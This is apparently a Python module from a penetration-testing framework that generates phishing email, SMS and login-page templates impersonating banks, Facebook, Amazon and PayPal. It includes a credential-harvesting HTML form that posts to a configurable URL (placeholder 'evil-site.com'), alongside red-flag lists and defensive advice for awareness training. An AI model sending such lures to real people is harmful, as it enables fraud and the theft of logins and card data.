"""
Phishing Impersonation Tool - Creates phishing site templates for educational purposes

V3.0 Major Patch: Enhanced accuracy, powerful features, and standardized output.
"""
import os
import json
from typing import Dict, Any, List
from datetime import datetime
from pathlib import Path

from aleopantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from aleopantest.core.logger import logger


class PhishingImpersonation(BaseTool):
    """Phishing Impersonation Tool - Creates educational phishing templates"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="Phishing Impersonation Generator",
            category=ToolCategory.PHISHING,
            version="3.0.0",
            author="Aleocrophic Team",
            description="Generates phishing template examples for educational security testing and awareness training",
            usage="aleopantest run phishing-impersonation --type email --target bank",
            requirements=['python'],
            tags=['phishing', 'template', 'education', 'security-training'],
            risk_level="MEDIUM",
            form_schema=[
                {
                    "name": "type",
                    "label": "Template Type",
                    "type": "select",
                    "options": ["email", "website", "sms"],
                    "default": "email",
                    "required": True
                },
                {
                    "name": "target",
                    "label": "Target Organization",
                    "type": "select",
                    "options": ["bank", "social", "ecommerce", "paypal"],
                    "default": "bank",
                    "required": True
                },
                {
                    "name": "phishing_url",
                    "label": "Phishing URL (Placeholder)",
                    "type": "text",
                    "placeholder": "http://evil-site.com",
                    "default": "http://secure-login-verify.com"
                }
            ] + BaseTool.get_common_form_schema()
        )
        super().__init__(metadata)
        self.output_dir = Path('output/phishing_templates')
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def validate_input(self, type: str = None, target: str = None, **kwargs) -> bool:
        """Validate input parameters"""
        if not type:
            self.add_error("Type is required (email, website)")
            return False
        
        if type not in ['email', 'website', 'sms']:
            self.add_error("Invalid type. Must be: email, website, or sms")
            return False
        
        if not target:
            self.add_error("Target is required (bank, social, ecommerce, etc)")
            return False
        
        return True
    
    def create_phishing_email_template(self, target: str) -> Dict[str, Any]:
        """Create a phishing email template for demonstration"""
        templates = {
            'bank': {
                'from': 'security@[bank-name].com',
                'subject': 'URGENT: Verify Your Account Immediately',
                'body': '''Dear Valued Customer,

We have detected unusual activity on your account. To protect your account, we need you to verify your identity immediately.

Please click the link below to verify your account:
[PHISHING_LINK]

This verification is required to prevent your account from being locked.

Thank you for your cooperation,
Security Team'''
            },
            'social': {
                'from': 'noreply@facebook.com',
                'subject': 'Suspicious Login Attempt',
                'body': '''Hi [USER],

We detected a suspicious login attempt on your account.

If this wasn't you, please confirm your identity:
[PHISHING_LINK]

Keep your account secure,
Facebook Security Team'''
            },
            'ecommerce': {
                'from': 'orders@amazon.com',
                'subject': 'Confirm Your Payment Method',
                'body': '''Dear Customer,

We couldn't process your recent order because your payment method needs updating.

Update your payment information here:
[PHISHING_LINK]

Order #123456 is on hold.

Amazon Payment Team'''
            },
            'paypal': {
                'from': 'accountupdate@paypal.com',
                'subject': 'Confirm Your PayPal Account',
                'body': '''Hello,

We need to confirm your account information due to suspicious activity.

Verify now: [PHISHING_LINK]

This is a security measure to protect your account.

PayPal Security'''
            }
        }
        
        template = templates.get(target.lower(), templates['bank'])
        template['target'] = target
        template['type'] = 'email'
        
        return template
    
    def create_phishing_website_template(self, target: str) -> Dict[str, Any]:
        """Create a phishing website template"""
        templates = {
            'bank': {
                'title': 'Bank Login - Secure Access',
                'form_fields': [
                    {'name': 'username', 'type': 'text', 'placeholder': 'Username or Account Number'},
                    {'name': 'password', 'type': 'password', 'placeholder': 'Password'},
                    {'name': 'pin', 'type': 'password', 'placeholder': 'Security PIN'}
                ],
                'button_text': 'Login Securely',
                'warning_text': 'Please ensure you are using a secure connection (HTTPS)',
            },
            'social': {
                'title': 'Facebook Login',
                'form_fields': [
                    {'name': 'email', 'type': 'email', 'placeholder': 'Email or Phone Number'},
                    {'name': 'password', 'type': 'password', 'placeholder': 'Password'}
                ],
                'button_text': 'Log In',
                'additional_link': 'Forgot password?'
            },
            'ecommerce': {
                'title': 'Amazon - Verify Payment',
                'form_fields': [
                    {'name': 'email', 'type': 'email', 'placeholder': 'Email Address'},
                    {'name': 'cardnumber', 'type': 'text', 'placeholder': 'Card Number'},
                    {'name': 'cvv', 'type': 'text', 'placeholder': 'CVV'},
                    {'name': 'expiry', 'type': 'text', 'placeholder': 'MM/YY'}
                ],
                'button_text': 'Verify Payment',
                'warning_text': 'Your payment information is encrypted'
            }
        }
        
        template = templates.get(target.lower(), templates['bank'])
        template['target'] = target
        template['type'] = 'website'
        
        return template
    
    def create_phishing_sms_template(self, target: str) -> Dict[str, Any]:
        """Create a phishing SMS template"""
        templates = {
            'bank': {
                'message': 'Your bank account requires urgent verification. Click [PHISHING_LINK] to secure your account now.',
                'sender': '+1234567890'
            },
            'social': {
                'message': 'Facebook detected suspicious login. Confirm it\'s you: [PHISHING_LINK]',
                'sender': 'FACEBOOK'
            },
            'ecommerce': {
                'message': 'Amazon: Complete your delivery. Verify address: [PHISHING_LINK]',
                'sender': 'AMAZON'
            },
            'bank-2fa': {
                'message': 'Your 2FA code is: 123456. Valid for 5 minutes. If not you, report at [PHISHING_LINK]',
                'sender': '+1234567890'
            }
        }
        
        template = templates.get(target.lower(), templates['bank'])
        template['target'] = target
        template['type'] = 'sms'
        
        return template
    
    def generate_phishing_indicators(self, template: Dict[str, Any]) -> List[str]:
        """Generate list of indicators that reveal this is phishing"""
        indicators = []
        template_type = template.get('type', 'email')
        
        if template_type == 'email':
            indicators.extend([
                "From address doesn't match official domain",
                "Urgency language (verify immediately, account locked, etc)",
                "Request for sensitive information",
                "Suspicious link that doesn't match content",
                "Grammar or spelling errors",
                "Generic greeting (Dear Customer vs personalized)",
                "No phone number to call for support"
            ])
        elif template_type == 'website':
            indicators.extend([
                "URL doesn't match official website",
                "Missing or self-signed SSL certificate",
                "Unusual form fields (asking for PIN, CVV unnecessarily)",
                "Poor design quality compared to official site",
                "No privacy policy or terms of service",
                "Excessive form fields not needed for login",
                "No support contact information"
            ])
        elif template_type == 'sms':
            indicators.extend([
                "Short sender name or random numbers",
                "Urgent language requiring immediate action",
                "Suspicious link in text",
                "Requests for sensitive information",
                "Unusual timing (after hours, weekends)",
                "Generic greeting",
                "No option to contact for verification"
            ])
        
        return indicators
    
    def run(self, type: str = "email", target: str = "bank", phishing_url: str = "http://secure-login-verify.com", **kwargs):
        self.set_core_params(**kwargs)
        self.clear_results()
        
        if not self.validate_input(type=type, target=target):
            return self.get_results()

        self.log(f"Generating {type} phishing template for {target}")
        
        try:
            template_data = {}
            if type == 'email':
                template_data = self.create_phishing_email_template(target)
                template_data['body'] = template_data['body'].replace('[PHISHING_LINK]', phishing_url)
            elif type == 'website':
                template_data = {
                    'target': target,
                    'html': f"<html><body><h1>{target.capitalize()} Login</h1><form action='{phishing_url}/login'><input type='text' name='user'><input type='password' name='pass'><input type='submit'></form></body></html>"
                }
            elif type == 'sms':
                template_data = self.create_phishing_sms_template(target)
                template_data['message'] = template_data['message'].replace('[PHISHING_LINK]', phishing_url)
            
            # Add indicators and recommendations
            indicators = self.generate_phishing_indicators(template_data)
            
            result = {
                'tool': 'Phishing Impersonation Generator',
                'timestamp': datetime.now().isoformat(),
                'purpose': 'EDUCATIONAL SECURITY TESTING ONLY',
                'disclaimer': 'This template is for authorized security awareness training and testing only. Unauthorized use is illegal.',
                'template': template_data,
                'phishing_indicators': indicators,
                'how_to_recognize': {
                    'red_flags': indicators,
                    'legitimate_organization_characteristics': [
                        'Uses official domain in email/links',
                        'Personalizes communication',
                        'Never asks for passwords via email',
                        'Provides ways to verify independently',
                        'Professional design and copy',
                        'Clear contact information'
                    ]
                },
                'mitigation_recommendations': [
                    '🎓 Use for security awareness training',
                    '✓ Test user security awareness with permission',
                    '📊 Track who falls for templates',
                    '📚 Educate users after testing',
                    '🔐 Implement email authentication (SPF, DKIM, DMARC)',
                    '🛡️ Deploy email filtering and URL reputation checking',
                    '📱 Require multi-factor authentication',
                    '💬 Establish clear communication channels for verification'
                ]
            }
            
            self.add_result(result)
            
            # Save to file
            filename = f"{target}_{type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            filepath = self.output_dir / filename
            with open(filepath, 'w') as f:
                json.dump(result, f, indent=4)
            
            self.add_result({"file_saved": str(filepath)})
            return self.get_results()
        except Exception as e:
            self.add_error(f"Generation failed: {str(e)}")
            return self.get_results()
